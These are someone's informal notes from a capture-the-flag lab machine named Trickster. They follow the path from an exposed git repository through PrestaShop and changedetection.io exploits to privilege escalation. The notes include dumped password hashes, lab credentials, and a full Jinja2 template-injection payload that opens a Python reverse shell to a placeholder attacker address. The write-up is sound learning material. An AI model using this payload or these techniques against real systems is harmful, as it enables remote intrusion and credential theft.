___


port 22 and 80

shop subdomain has stuff the other looks kinda empty


mysql as database and PrestaShop as CMS it looks 



Email us: [admin@trickster.htb](mailto:admin@trickster.htb)



Version pc.7.3

NCC Version: ncc-5.2.0

Failed to complete request to https://iam-proxy.ntnx-base:8445/api/iam/authz/v1/proxy after 5 tries. Error: <urlopen error EOF occurred in violation of protocol (_ssl.c:1147)>



*.git/config found*
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
	name = adam




*git directory is exposed*
# Index of /.git




*robots.txt has hella dirs*
this file is auto generated on presta shop though




*found modules*

============================ Modules =======================================

[+] Module: blockreassurance
[+] Module: ps_socialfollow
[+] Module: ps_searchbar
[+] Module: productcomments
[+] Module: blockwishlist
[+] Module: ps_imageslider
[+] Module: ps_shoppingcart
[+] Module: ps_banner
[+] Module: ps_emailalerts
[+] Module: ps_emailsubscription




ADAM is a name in the repo apparently




*things to check*
vulnerable presta shop modules
some file with creds
user admi or adam or some other user with git push on repo



*git commit mssg*
cat COMMIT_EDITMSG
update admin pannel




adam <adam@trickster.htb> 1716538399 -0400	commit (initial): update admin pannel



*this was the commit I have to find the diff for*
0cbc7831c1104f1fb0948ba46f75f1666e18e64c




*truffle hog flagged this no idea why*
└> nvim /home/ew/box/trickster/git_dump/.git/objects/62/585aa06f38d994b20e6345f095996170043034



*this has dep and vers of some stuff*
└> nvim /home/ew/box/trickster/git_dump/admin634ewutrx1jgitlooaj/themes/new-theme/package-lock.json




*I think this whole repo is just the admin pannel thats the name at least*

*I think this is admin panel*
admin634ewutrx1jgitlooaj



*that is the admin panel and I also got the version*

8.1.5




i think som vulns here


*I think this the RCE right here*
https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/


ok got shell


I imagine is probs adam the user



app/config -> parameters.php file has a bunch of stuff probs it




*finally some hashes*

MariaDB [prestashop]> select * from ps_employee;
+-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------+
| id_employee | id_profile | id_lang | lastname | firstname | email               | passwd                                                       | last_passwd_gen     | stats_date_from | stats_date_to | stats_compare_from | stats_compare_to | stats_compare_option | preselect_date_range | bo_color | bo_theme | bo_css    | default_tab | bo_width | bo_menu | active | optin | id_last_order | id_last_customer_message | id_last_customer | last_connection_date | reset_password_token | reset_password_validity | has_enabled_gravatar |
+-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------+
|           1 |          1 |       1 | Store    | Trickster | admin@trickster.htb | $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C | 2024-05-25 13:10:20 | 2024-04-25      | 2024-05-25    | 0000-00-00         | 0000-00-00       |                    1 | NULL                 | NULL     | default  | theme.css |           1 |        0 |       1 |      1 |  NULL |             5 |                        0 |                0 | 2025-09-19           | NULL                 | 0000-00-00 00:00:00     |                    0 |
|           2 |          2 |       0 | james    | james     | james@trickster.htb | $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm | 2024-09-09 13:22:42 | NULL            | NULL          | NULL               | NULL             |                    1 | NULL                 | NULL     | NULL     | NULL      |           0 |        0 |       1 |      0 |  NULL |             0 |                        0 |                0 | NULL                 | NULL                 | NULL                    |                    0 |
+-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------+


*cracked a hash james ssh pass *
alwaysandforever 


damn wasn't that bad but took me a min


*ok what now -> priv esc?*

-either crack more hashes for lateral movement
-check what james owns on filesystem
-theres som stuff on opt
-connect to chrome port (idk tho that might b just box functionality)



*runner user might be click XSS on the site as well as running this might be able to connect with chrome debug feature*
 /home/runner/prestashop/chromedriver --port=34627 


runc is running a container

I saw a sendmail command on pspy




okay seems like james has no interesting files that he owns




*prusaslicer in opt can get me rce by modifying the .mf3 file -> lateral or priv esc? r there processes running that?*




2025/09/20 20:45:01 CMD: UID=0    PID=9802   | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem root






sudo nmap -sSVC localhost -p35023 --vv -Pn -> running golang http server 

not chrome debug port 




*changedetection.py what is this*

2025/09/20 21:16:59 CMD: UID=0    PID=11186  | python ./changedetection.py -d /datastore 




so container is running but no ports from it are forwarded on the locahost

have to access the ip directly at the port wich is 5000 default for this service


so this is docker bridge (virtual switch)

docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1


addresses for containers start at 172.17.0.2 and increment



SSTI on jinja2 template server side RCE 

https://www.hacktivesecurity.com/blog/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/



# rev shell payload

{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"x.x.x.x\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}





# ok got root on docker container

 cat secret.txt
5fce75c64d33acf05d2d3b21d29e693d992f240d5c440310cff3edfb743c64a5# 

what is this




            "notification_urls": [],
            "pager_size": 50,
            "password": "yyyZe28Iu0oP02jyCsmZXQGPgzdi4yoEqLuvJ4HEysNflXTd8YoRAIr6yDEVcDc//hijc+HKgjTr2qinYRknig==",
            "render_anchor_tag_content": false,
            "schema_version": 14,
            "shared_diff_access": false,
            "webdriver_delay": null,





*secret.txt*
5fce75c64d33acf05d2d3b21d29e693d992f240d5c440310cff3edfb743c64a5


*password*
"password": "yyyZe28Iu0oP02jyCsmZXQGPgzdi4yoEqLuvJ4HEysNflXTd8YoRAIr6yDEVcDc//hijc+HKgjTr2qinYRknig==",





*found in one of the backup files*

                'database_name' => 'prestashop' ,                                                                                                                      
                'database_user' => 'adam' ,                                                                                                                            
                'database_password' => 'adam_admin992'





sudo -l 

User adam may run the following commands on trickster:
    (ALL) NOPASSWD: /opt/PrusaSlicer/prusaslicer




*if can run sudo as prusa priv esc*

https://github.com/suce0155/prusaslicer_exploit




